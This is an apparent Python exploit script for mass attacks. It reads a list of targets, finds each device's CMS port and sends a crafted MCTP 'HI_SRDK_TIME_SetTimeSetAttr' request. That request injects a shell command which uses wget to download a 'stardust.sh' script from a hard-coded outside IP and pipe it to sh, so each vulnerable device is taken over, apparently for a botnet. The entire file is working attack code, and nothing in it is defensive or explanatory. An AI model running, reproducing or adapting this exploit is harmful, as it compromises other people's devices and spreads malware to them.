from threading import Thread
from socket import *

payload = "`wget http://84.200.81.239/hiddenbin/stardust.sh|sh -O-|sh`"
rce_request = "Segment-Num:1\r\nSegment-Seq:1\r\nData-Length:{}\r\n\r\n\x01\x00\x15\x01{}\x00\x00\x00\x00\x00\x02\x00\x60\x65\x5d\x00\x00\x00\x00\x00\x10\x00\x00\x00\x0c\x24\x36\x00\xf0\x00\x00\x00\x00\x00\x00\x00\x68\x00\x00\x00\x40\x29\x60\x00\r\n\r\n".format(43 + len(payload), payload)
setup_rce_request = "REMOTE HI_SRDK_TIME_SetTimeSetAttr MCTP/1.0\r\nCSeq:6\r\nAccept:text/HDP\r\nContent-Type:text/HDP\r\nFunc-Version:0x10\r\nContent-Length:{}\r\n\r\n".format(len(rce_request))
i = 0

def hex_dump(data):
    ret = ""
    for byte in data:
        ret += "\\x%02x" % (ord(byte))

    return ret

def get_cms_port(target):
    addr,port = target.split(":")
    sock = socket()    
    cms_port = "8080"
    try:
        sock.connect((addr, int(port)))
        sock.send("GET /play.html HTTP/1.0\r\n\r\n")
    except:
        sock.close()
        return int(cms_port)
        
    try:
        while True:
            buf = sock.recv(4096)
            if not buf:break

            if "var setupport = " in buf:

                cms_port = buf.split("var setupport =")[1].split(";")[0]
                print(int(cms_port.rstrip().rstrip(" ").strip(" ")))
                return int(cms_port.rstrip().rstrip(" ").strip(" "))
    except:
        pass

    sock.close()
    return int(cms_port)

def exploit(target):
    global i
    
    sock = socket()

    target,cms_port = target.split(":")

    try:
        sock.connect((target, int(cms_port)))
    except:
        sock.close()
        return
    
    try:
        sock.send(setup_rce_request + rce_request)

        sock.send(rce_request)

        buf = sock.recv(65505)

        if "Return-Code:0" in str(buf) and "200 OK" in str(buf):
            i += 1
            print("Success {} {} {}".format(i, target, cms_port))
        elif "Return-Code" in str(buf):
            print(buf)

    except Exception as e:
        print(e)
        pass

    sock.close()


for line in open('f.txt').readlines():
    Thread(target = exploit, args=(line.rstrip(),),).start()
